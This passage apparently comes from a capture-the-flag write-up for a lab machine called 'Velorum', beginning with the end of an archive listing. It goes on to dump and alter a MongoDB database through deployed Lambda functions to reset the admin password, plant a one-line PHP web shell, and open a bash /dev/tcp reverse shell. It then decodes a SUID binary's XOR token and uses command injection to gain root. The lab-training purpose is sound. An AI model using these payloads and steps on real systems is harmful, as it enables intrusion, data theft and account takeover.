2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/etc
2025-06-27 14:41:06 .....          377          255  node_modules/mongodb/etc/prepare.js
2025-06-27 14:41:06 .....         1342          626  node_modules/mongodb/tsconfig.json
2025-06-27 14:41:06 .....        16465         5569  node_modules/mongodb/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/bson
2025-06-27 14:41:06 .....        11357         3948  node_modules/bson/LICENSE.md
2025-06-27 14:41:06 D....            0            0  node_modules/bson/src
2025-06-27 14:41:06 .....         2607          999  node_modules/bson/src/error.ts
2025-06-27 14:41:06 .....        17336         5330  node_modules/bson/src/extended_json.ts
2025-06-27 14:41:06 .....         1140          465  node_modules/bson/src/symbol.ts
2025-06-27 14:41:06 .....        45620         9550  node_modules/bson/src/long.ts
2025-06-27 14:41:06 .....         8182         2162  node_modules/bson/src/bson.ts
2025-06-27 14:41:06 D....            0            0  node_modules/bson/src/parser
2025-06-27 14:41:06 .....         2262          853  node_modules/bson/src/parser/utils.ts
2025-06-27 14:41:06 .....        32091         4811  node_modules/bson/src/parser/serializer.ts
2025-06-27 14:41:06 .....         7140         1620  node_modules/bson/src/parser/calculate_size.ts
2025-06-27 14:41:06 .....        22195         5080  node_modules/bson/src/parser/deserializer.ts
2025-06-27 14:41:06 D....            0            0  node_modules/bson/src/parser/on_demand
2025-06-27 14:41:06 .....          791          365  node_modules/bson/src/parser/on_demand/index.ts
2025-06-27 14:41:06 .....         5042         1608  node_modules/bson/src/parser/on_demand/parse_to_elements.ts
2025-06-27 14:41:06 .....         3430         1110  node_modules/bson/src/regexp.ts
2025-06-27 14:41:06 .....        23734         5993  node_modules/bson/src/binary.ts
2025-06-27 14:41:06 .....          606          270  node_modules/bson/src/index.ts
2025-06-27 14:41:06 .....         1201          515  node_modules/bson/src/parse_utf8.ts
2025-06-27 14:41:06 .....         3110         1126  node_modules/bson/src/int_32.ts
2025-06-27 14:41:06 .....         5340         1662  node_modules/bson/src/timestamp.ts
2025-06-27 14:41:06 .....        27794         6694  node_modules/bson/src/decimal128.ts
2025-06-27 14:41:06 .....          527          261  node_modules/bson/src/min_key.ts
2025-06-27 14:41:06 .....         3504         1310  node_modules/bson/src/double.ts
2025-06-27 14:41:06 .....         3171         1186  node_modules/bson/src/db_ref.ts
2025-06-27 14:41:06 .....        11440         3279  node_modules/bson/src/objectid.ts
2025-06-27 14:41:06 .....         1833          714  node_modules/bson/src/code.ts
2025-06-27 14:41:06 .....          527          261  node_modules/bson/src/max_key.ts
2025-06-27 14:41:06 .....         3532          978  node_modules/bson/src/constants.ts
2025-06-27 14:41:06 D....            0            0  node_modules/bson/src/utils
2025-06-27 14:41:06 .....         7011         1387  node_modules/bson/src/utils/number_utils.ts
2025-06-27 14:41:06 .....         6535         2102  node_modules/bson/src/utils/web_byte_utils.ts
2025-06-27 14:41:06 .....         6163         1983  node_modules/bson/src/utils/node_byte_utils.ts
2025-06-27 14:41:06 .....         3233         1273  node_modules/bson/src/utils/byte_utils.ts
2025-06-27 14:41:06 .....         1435          654  node_modules/bson/src/utils/string_utils.ts
2025-06-27 14:41:06 .....         3221         1016  node_modules/bson/src/utils/latin.ts
2025-06-27 14:41:06 .....          901          421  node_modules/bson/src/bson_value.ts
2025-06-27 14:41:06 D....            0            0  node_modules/bson/vendor
2025-06-27 14:41:06 D....            0            0  node_modules/bson/vendor/base64
2025-06-27 14:41:06 .....         1077          631  node_modules/bson/vendor/base64/LICENSE-MIT.txt
2025-06-27 14:41:06 .....          925          462  node_modules/bson/vendor/base64/package.json
2025-06-27 14:41:06 .....         4639         1828  node_modules/bson/vendor/base64/base64.js
2025-06-27 14:41:06 .....         4019         1659  node_modules/bson/vendor/base64/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/bson/vendor/text-encoding
2025-06-27 14:41:06 .....        12897         4637  node_modules/bson/vendor/text-encoding/LICENSE.md
2025-06-27 14:41:06 .....          258          175  node_modules/bson/vendor/text-encoding/index.js
2025-06-27 14:41:06 D....            0            0  node_modules/bson/vendor/text-encoding/lib
2025-06-27 14:41:06 .....       530093       189308  node_modules/bson/vendor/text-encoding/lib/encoding-indexes.js
2025-06-27 14:41:06 .....       101101        16606  node_modules/bson/vendor/text-encoding/lib/encoding.js
2025-06-27 14:41:06 .....         1088          498  node_modules/bson/vendor/text-encoding/package.json
2025-06-27 14:41:06 .....         3759         1722  node_modules/bson/vendor/text-encoding/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/bson/lib
2025-06-27 14:41:06 .....       174869        28504  node_modules/bson/lib/bson.node.mjs.map
2025-06-27 14:41:06 .....       175219        28547  node_modules/bson/lib/bson.cjs.map
2025-06-27 14:41:06 .....       175643        28622  node_modules/bson/lib/bson.rn.cjs.map
2025-06-27 14:41:06 .....       176252        30623  node_modules/bson/lib/bson.node.mjs
2025-06-27 14:41:06 .....       177141        30797  node_modules/bson/lib/bson.cjs
2025-06-27 14:41:06 .....       175232        28554  node_modules/bson/lib/bson.bundle.js.map
2025-06-27 14:41:06 .....       177686        30854  node_modules/bson/lib/bson.rn.cjs
2025-06-27 14:41:06 .....       175066        28524  node_modules/bson/lib/bson.mjs.map
2025-06-27 14:41:06 .....       176429        30625  node_modules/bson/lib/bson.mjs
2025-06-27 14:41:06 .....       177090        30842  node_modules/bson/lib/bson.bundle.js
2025-06-27 14:41:06 .....        62843        12753  node_modules/bson/bson.d.ts
2025-06-27 14:41:06 .....         4030         1403  node_modules/bson/package.json
2025-06-27 14:41:06 D....            0            0  node_modules/bson/etc
2025-06-27 14:41:06 .....          615          356  node_modules/bson/etc/prepare.js
2025-06-27 14:41:06 .....        13385         4036  node_modules/bson/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb-connection-string-url
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb-connection-string-url/lib
2025-06-27 14:41:06 .....         2577          776  node_modules/mongodb-connection-string-url/lib/index.d.ts
2025-06-27 14:41:06 .....         8159         2163  node_modules/mongodb-connection-string-url/lib/index.js
2025-06-27 14:41:06 .....         6982         1644  node_modules/mongodb-connection-string-url/lib/index.js.map
2025-06-27 14:41:06 .....         4079         1189  node_modules/mongodb-connection-string-url/lib/redact.js
2025-06-27 14:41:06 .....         2537          641  node_modules/mongodb-connection-string-url/lib/redact.js.map
2025-06-27 14:41:06 .....          423          179  node_modules/mongodb-connection-string-url/lib/redact.d.ts
2025-06-27 14:41:06 .....         1782          683  node_modules/mongodb-connection-string-url/package.json
2025-06-27 14:41:06 .....        10759         3722  node_modules/mongodb-connection-string-url/LICENSE
2025-06-27 14:41:06 .....          264          128  node_modules/mongodb-connection-string-url/.esm-wrapper.mjs
2025-06-27 14:41:06 .....          882          463  node_modules/mongodb-connection-string-url/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/punycode
2025-06-27 14:41:06 .....        12780         4270  node_modules/punycode/punycode.es6.js
2025-06-27 14:41:06 .....         1077          631  node_modules/punycode/LICENSE-MIT.txt
2025-06-27 14:41:06 .....         1227          505  node_modules/punycode/package.json
2025-06-27 14:41:06 .....         5719         2302  node_modules/punycode/README.md
2025-06-27 14:41:06 .....        12711         4253  node_modules/punycode/punycode.js
2025-06-27 14:41:06 D....            0            0  node_modules/whatwg-url
2025-06-27 14:41:06 .....         1264          399  node_modules/whatwg-url/index.js
2025-06-27 14:41:06 D....            0            0  node_modules/whatwg-url/lib
2025-06-27 14:41:06 .....         1186          435  node_modules/whatwg-url/lib/Function.js
2025-06-27 14:41:06 .....          518          227  node_modules/whatwg-url/lib/infra.js
2025-06-27 14:41:06 .....        31747         6408  node_modules/whatwg-url/lib/url-state-machine.js
2025-06-27 14:41:06 .....         4887         1299  node_modules/whatwg-url/lib/percent-encoding.js
2025-06-27 14:41:06 .....        17119         2535  node_modules/whatwg-url/lib/URLSearchParams.js
2025-06-27 14:41:06 .....         2280          774  node_modules/whatwg-url/lib/urlencoded.js
2025-06-27 14:41:06 .....        15382         1859  node_modules/whatwg-url/lib/URL.js
2025-06-27 14:41:06 .....          728          348  node_modules/whatwg-url/lib/VoidFunction.js
2025-06-27 14:41:06 .....         2970          909  node_modules/whatwg-url/lib/URLSearchParams-impl.js
2025-06-27 14:41:06 .....          328          171  node_modules/whatwg-url/lib/encoding.js
2025-06-27 14:41:06 .....         5390         1613  node_modules/whatwg-url/lib/utils.js
2025-06-27 14:41:06 .....         5083         1288  node_modules/whatwg-url/lib/URL-impl.js
2025-06-27 14:41:06 .....          170           91  node_modules/whatwg-url/webidl2js-wrapper.js
2025-06-27 14:41:06 .....         1356          615  node_modules/whatwg-url/package.json
2025-06-27 14:41:06 .....         1076          629  node_modules/whatwg-url/LICENSE.txt
2025-06-27 14:41:06 .....         7074         2390  node_modules/whatwg-url/README.md
2025-06-27 14:41:06 .....         5500         1725  node_modules/.package-lock.json
2025-06-27 14:41:06 .....         5652         1749  package-lock.json
2025-06-27 14:41:06 .....          272          181  package.json
------------------- ----- ------------ ------------  ------------------------
2025-06-27 15:23:23            7704886      1711320  579 files, 64 folders
➜  vault_app git:(main) ✗

```

## MongoDB Database Manipulation

### Lambda Function Code Modification

We modify the Lambda function code to dump all MongoDB databases and collections:

```js
// handler.js - dump every MongoDB document
const { MongoClient } = require('mongodb');

const uri = 'mongodb://172.25.0.10:27017';

exports.handler = async () => {
  const client = new MongoClient(uri, { useUnifiedTopology: true });

  try {
    await client.connect();
    const admin = client.db().admin();
    const dbs = (await admin.listDatabases()).databases || [];

    const dump = {};

    for (const { name } of dbs) {
      const db = client.db(name);
      const collections = await db.listCollections().toArray();

      dump[name] = {};

      for (const { name: collName } of collections) {
        try {
          const docs = await db.collection(collName).find({}).toArray();
          dump[name][collName] = docs;       // store full docs, not just keys
        } catch (e) {
          dump[name][collName] = { error: e.message };
        }
      }
    }

    return {
      statusCode: 200,
      body: JSON.stringify(dump, null, 2),
      headers: { 'Content-Type': 'application/json' },
    };
  } catch (err) {
    return { statusCode: 500, body: JSON.stringify({ error: err.message }) };
  } finally {
    await client.close().catch(() => {});
  }
};
```

**Key Findings:**
- The Lambda function connects to MongoDB at `172.25.0.10:27017`
- We can modify the function to dump all databases and collections
- This reveals the MongoDB connection string and database structure

### Deploying Modified Lambda Function

We package and deploy our modified Lambda function:

```bash
zip -r ../mongo-full-enum.zip handler.js node_modules package.json
```

```bash
aws lambda create-function \
  --function-name MongoFullEnum \
  --runtime nodejs18.x \
  --role arn:aws:iam::000000000000:role/lambda-execute-role \
  --handler handler.handler \
  --zip-file fileb://mongo-full-enum.zip \
  --timeout 15 \
  --memory-size 256 \
  --endpoint-url http://cloud.velorum.hc
```

### Executing Database Dump

We invoke the function to dump all MongoDB data:

```bash
aws lambda invoke \
  --function-name MongoFullEnum \
  --endpoint-url http://cloud.velorum.hc \
  output.json 
```

### Database Analysis

We analyze the dumped MongoDB data:

```bash
➜  Velorum cat output.json| jq '.body' -r | jq '.|keys'
[
  "admin",
  "config",
  "local",
  "velorum_app",
  "velorum_vault"
]
```

**Key Discovery:** We find the `velorum_app` database contains user credentials:

```bash
➜  Velorum cat output.json| jq '.body' -r | jq '.velorum_app'
{
  "users": [
    {
      "_id": "685eb82b3620a293752fe230",
      "email": "admin@velorum.hc",
      "password": "$2y$12$utfeLO161spkah9qFcGqvuGOfqZRJ6J5SmDpdVJrE6a2bE73JCbbS",
      "created_at": "2025-07-10T15:59:20.165Z",
      "name": "Administrator",
      "profile_image": null
    }
  ]
}
```

**Analysis:**
- We discover an admin user with email `admin@velorum.hc`
- The password hash is `$2y$12$utfeLO161spkah9qFcGqvuGOfqZRJ6J5SmDpdVJrE6a2bE73JCbbS`
- This is a bcrypt hash that we cannot easily crack

### Password Hash Generation

Since we cannot crack the existing hash, we generate a new bcrypt hash for a known password:

```python
➜  VaultFunction uv run --with bcrypt python - <<'PY'
import bcrypt
pw = b'P@$$word123!'
h = bcrypt.hashpw(pw, bcrypt.gensalt(12))
print(h.decode())
PY

$2b$12$o8fu0hQLd/2zUNNK.qiAL.XfyExZoLZ/sH8J/2f2r3rroVDH9aANG
```

**Strategy:** Instead of cracking the existing hash, we'll modify the database to use our known password hash.

### Creating Password Change Handler

We create a new Lambda function to update the admin password in the database:

```js
➜  VaultFunction cat handler.js
// updatePassword.js - Update admin password in velorum_app database
const { MongoClient } = require('mongodb');

const uri = 'mongodb://172.25.0.10:27017';

exports.handler = async () => {
  const client = new MongoClient(uri, { useUnifiedTopology: true });

  try {
    await client.connect();

    // Connect to the velorum_app database
    const db = client.db('velorum_app');
    const usersCollection = db.collection('users');

    // Update the admin user's password
    const result = await usersCollection.updateOne(
      { email: 'admin@velorum.hc' }, // Find the admin user by email
      {
        $set: {
          password: '$2b$12$sa57GL5wfD.nXav7W6c77eP/C0vbH4WoNcXc50qKISQvFthkSQwR2'
        }
      }
    );

    if (result.matchedCount === 0) {
      return {
        statusCode: 404,
        body: JSON.stringify({
          error: 'Admin user not found',
          message: 'No user found with email admin@velorum.hc'
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    if (result.modifiedCount === 0) {
      return {
        statusCode: 200,
        body: JSON.stringify({
          message: 'Password was already set to the new value',
          matchedCount: result.matchedCount,
          modifiedCount: result.modifiedCount
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    return {
      statusCode: 200,
      body: JSON.stringify({
        message: 'Admin password updated successfully',
        matchedCount: result.matchedCount,
        modifiedCount: result.modifiedCount
      }),
      headers: { 'Content-Type': 'application/json' }
    };

  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Database operation failed',
        message: err.message
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  } finally {
    await client.close().catch(() => {});
  }
};
```

**Key Features:**
- Connects to the MongoDB database
- Updates the admin user's password hash
- Provides detailed response about the operation
- Handles error cases gracefully

### Deploying Password Change Function

We package and deploy the password change function:

```bash
zip -r ../mongo-change-admin-pass.zip handler.js node_modules package.json
```

```bash
➜  Velorum aws lambda create-function \
  --function-name ChangePass \
  --runtime nodejs18.x \
  --role arn:aws:iam::000000000000:role/lambda-execute-role \
  --handler handler.handler \
  --zip-file fileb://mongo-change-admin-pass.zip \
  --timeout 15 \
  --memory-size 256 \
  --endpoint-url http://cloud.velorum.hc
```

### Executing Password Change

We invoke the function to change the admin password:

```bash
➜  Velorum aws lambda invoke \
  --function-name ChangePass \
  --endpoint-url http://cloud.velorum.hc \
  output.json && jq . output.json

{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
{
  "statusCode": 200,
  "body": "{\"message\":\"Admin password updated successfully\",\"matchedCount\":1,\"modifiedCount\":1}",
  "headers": {
    "Content-Type": "application/json"
  }
}
```

**Success:** The admin password has been successfully updated in the database.

## Web Application Access

### Successful Login

We can now login to `velorum.hc` with our new password for `admin@velorum.hc`:
![Admin Login Success](file-20251017174443886.png)

### File Upload Vulnerability Discovery

We discover that the application allows profile picture uploads:
![Profile Picture Upload](file-20251017174521915.png)

### Web Shell Upload

We can upload a PHP web shell by appending `.php` to the filename:
```php
<?php system($_GET[0]);?>
```

**File Upload Process:**
1. Upload a file with `.php` extension
2. The application stores it in a web-accessible directory
3. We can access the file and execute commands

![Source Code File Location Disclosure](file-20251017174727436.png)

![Webshell Command Execution](file-20251017174756622.png)

### Initial System Access

We gain a shell using a reverse shell payload:
```bash
bash -c "bash -i >& /dev/tcp/ip/port 0>&1"
```

![Reverse Shell Obtained](file-20251017175039154.png)

## SUID Binary Analysis

### Discovering SUID Binary

We discover a SUID binary called `vaultauth`:
![SUID Binary Discovery](file-20251017175804768.png)

### Binary Transfer and Analysis

We transfer the binary to our host machine for analysis:
![Binary Transfer](file-20251017175903346.png)

### Ghidra Reverse Engineering

Opening the binary with Ghidra reveals the program logic:

```c
undefined8 FUN_0010130c(void)
{
  int iVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char token_input [64];
  char local_118 [64];
  char local_d8 [64];
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter your encrypted token: ");
  fgets(token_input,0x40,stdin);
  sVar2 = strcspn(token_input,"\n");
  token_input[sVar2] = '\0';
  strncpy(local_118,token_input,0x40);
  sVar2 = strlen(local_118);
  FUN_00101289(local_118,sVar2 & 0xffffffff);
  iVar1 = strncmp(local_118,&DAT_00104020,10);
  if (iVar1 == 0) {
    printf("Access granted! Enter username to verify: ");
    fgets(local_d8,0x40,stdin);
    sVar2 = strcspn(local_d8,"\n");
    local_d8[sVar2] = '\0';
    setuid(0);
    snprintf(local_98,0x80,"grep \'^%s:\' /etc/passwd",local_d8);
    system(local_98);
  }
  else {
    puts("Invalid token.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

void FUN_00101289(long param_1,int param_2)
{
  int local_c;
  
  for (local_c = 0; local_c < param_2; local_c = local_c + 1) {
    *(byte *)(param_1 + local_c) = *(byte *)(param_1 + local_c) ^ (&DAT_00104010)[local_c % 10];
  }
  return;
}
```

**Key Findings:**
- The program requests an encrypted token
- It performs XOR decryption on the input
- If the decrypted token matches a hardcoded value, it grants access
- After successful authentication, it executes `setuid(0)` and runs a system command
- The system command is vulnerable to command injection via the username parameter

### Token Decryption Analysis

We reverse engineer the XOR encryption to find the correct token:

```python
'''This script is designed to find the original encrypted token by reversing the XOR encryption found in the provided C code.

The C code performs the following operation:
encrypted_token[i] ^ key[i % 10] = decrypted_token[i]

Since XOR is its own inverse, to find the original encrypted token, we can perform:
decrypted_token[i] ^ key[i % 10] = encrypted_token[i]

This script will take the known decrypted token (from DAT_00104020) and the XOR key (from DAT_00104010) to calculate the original encrypted token that needs to be provided to the program.
'''

# The 10-byte XOR key from memory address DAT_00104010
XOR_KEY = bytearray.fromhex("2233445566778899aabb")

# The 10-byte expected decrypted string from memory address DAT_00104020
DECRYPTED_TOKEN = bytearray.fromhex("6f587c040e00b1f09bee")

def find_encrypted_token(key, decrypted_token):
    encrypted_token = bytearray()
    for i in range(len(decrypted_token)):
        encrypted_byte = decrypted_token[i] ^ key[i % len(key)]
        encrypted_token.append(encrypted_byte)
    return encrypted_token

# Calculate the original encrypted token
encrypted_token = find_encrypted_token(XOR_KEY, DECRYPTED_TOKEN)

print(f"Calculated Encrypted Token (Hex): {encrypted_token.hex()}")
print(f"Calculated Encrypted Token (ASCII): {encrypted_token.decode(errors='ignore')}")
```

### Command Injection Vulnerability

The program constructs a command using `snprintf`:
```c
snprintf(local_98,0x80,"grep \'^%s:\' /etc/passwd",local_d8);
```

We can escape this command by injecting shell metacharacters. By sending `test' /any/file/for/grep; command ; echo '`, the command becomes:
```bash
grep 'test' /any/file/for/grep; 
command;
echo '' /etc/passwd
```

## Privilege Escalation

### Exploiting the SUID Binary

We execute the `vaultauth` binary with our calculated token and command injection payload:

```bash
www-data@ip-172-16-13-129:~/html/config$ vaultauth
Enter your encrypted token: Mk8Qhw9i1U
Access granted! Enter username to verify: a' /etc/passwd ; /bin/bash ; echo '
root@ip-172-16-13-129:~/html/config# cd /root
root@ip-172-16-13-129:/root# ls
Config  gitea  root.txt  snap
root@ip-172-16-13-129:/root#
```

**Success:** We have successfully escalated to root privileges!

### Access Gained
- **Web Application**: Admin access to `velorum.hc`
- **AWS Lambda**: Full control over Lambda functions
- **MongoDB**: Database manipulation capabilities
- **System Access**: Root privileges on the target machine

### Attack Chain Summary
1. **Subdomain Enumeration** → Discovered Git repository
2. **Git Repository Analysis** → Found AWS credentials
3. **AWS Lambda Exploitation** → Modified function code
4. **MongoDB Manipulation** → Changed admin password
5. **Web Application Access** → Logged in as admin
6. **File Upload Vulnerability** → Uploaded web shell
7. **SUID Binary Exploitation** → Escalated to root

---

## Conclusion

**Velorum** demonstrates a sophisticated attack chain involving multiple technologies and attack vectors. The machine showcases:

### Key Attack Vectors:
1. **Subdomain Enumeration** - Discovered hidden services and attack surface
2. **Git Repository Exposure** - Found hardcoded credentials in source code
3. **AWS Lambda Exploitation** - Modified function code to manipulate databases
4. **MongoDB Database Manipulation** - Changed user passwords directly in the database
5. **File Upload Vulnerability** - Bypassed file type restrictions to upload web shells
6. **SUID Binary Exploitation** - Reverse engineered binary and exploited command injection

### Technical Highlights:
- **Multi-service architecture** involving web applications, cloud services, and databases
- **Credential exposure** through hardcoded secrets in version control
- **Database manipulation** through cloud function exploitation
- **Binary reverse engineering** and command injection exploitation
- **Privilege escalation** through SUID binary abuse

This machine represents an excellent learning platform for understanding:
- **Cloud security** (AWS Lambda, MongoDB)
- **Web application security** (file upload vulnerabilities)
- **Binary exploitation** (reverse engineering, command injection)
- **System administration** (SUID binaries, privilege escalation)
